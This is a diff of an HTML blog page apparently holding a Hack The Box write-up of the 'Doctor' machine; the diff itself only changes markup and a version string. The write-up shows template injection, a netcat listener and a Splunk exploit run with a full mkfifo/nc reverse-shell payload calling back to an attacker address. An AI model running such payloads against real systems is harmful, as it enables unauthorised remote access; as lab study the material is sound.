@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -60,7 +60,7 @@ Contact Me
 <p>Doctor is a machine in which I used Server Side Template injection to get to obtain shell access and then used enumeration and exploit vulnerable service to get root Access.</p>
 <h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
-<pre><code>nmap -sV -sV 10.10.10.209
+<pre tabindex=0><code>nmap -sV -sV 10.10.10.209
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:35 EDT
 Nmap scan report for doctors.htb (10.10.10.209)
 Host is up (0.17s latency).
@@ -76,7 +76,7 @@ Nmap done: 1 IP address (1 host up) scanned in 48.74 seconds
 </code></pre><p>A Normal HTTP, SSH Services and service called splunkd we will look it up later.</p>
 <h3 id=important>Important</h3>
 <p>An Important thing to do is to add the ip and domain to /etc/hosts becuase of the host routing.</p>
-<pre><code>127.0.0.1       localhost
+<pre tabindex=0><code>127.0.0.1       localhost
 127.0.1.1       kali
 10.10.10.209 doctors.htb
 # The following lines are desirable for IPv6 capable hosts
@@ -98,7 +98,7 @@ ff02::2 ip6-allrouters
 <img src=/images/blog/010/3.png alt=Username></p>
 <p><img src=/images/blog/010/4.png alt=Username></p>
 <p>I tried to identify the template engine and it was jinja 2. So, I started listening on netcat and added the payload to title as the pervious example and executed it as I visited /archive</p>
-<pre><code>nc -lvnp 9999
+<pre tabindex=0><code>nc -lvnp 9999
 </code></pre><p><img src=/images/blog/010/5.png alt=Username></p>
 <h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>I ran Linpeas and found a strange thing in password in logs section</p>
@@ -106,7 +106,7 @@ ff02::2 ip6-allrouters
 <p>So, I tried to su shaun using this as a password and it worked! At this time, I was thinking about the usage of Splunkd so I started searching for exploits and found this one
 <a href=https://github.com/DaniloCaruso/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py>Exploit</a></p>
 <p>Imeditatly I downloaded it and ran it</p>
-<pre><code>python exploit.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.110 --payload &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 1234 &gt;/tmp/f&quot; --username shaun --password Guitar123
+<pre tabindex=0><code>python exploit.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.110 --payload &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 1234 &gt;/tmp/f&quot; --username shaun --password Guitar123
 Running in remote mode (Remote Code Execution)
 [.] Authenticating...
 [+] Authenticated
@@ -120,7 +120,7 @@ Running in remote mode (Remote Code Execution)
 Press RETURN to cleanup
 
 </code></pre><p>And Started a listened in other netcat session</p>
-<pre><code>kali@kali:~$ nc -lvnp 1234
+<pre tabindex=0><code>kali@kali:~$ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.110] from (UNKNOWN) [10.10.10.209] 59218
 /bin/sh: 0: can't access tty; job control turned off
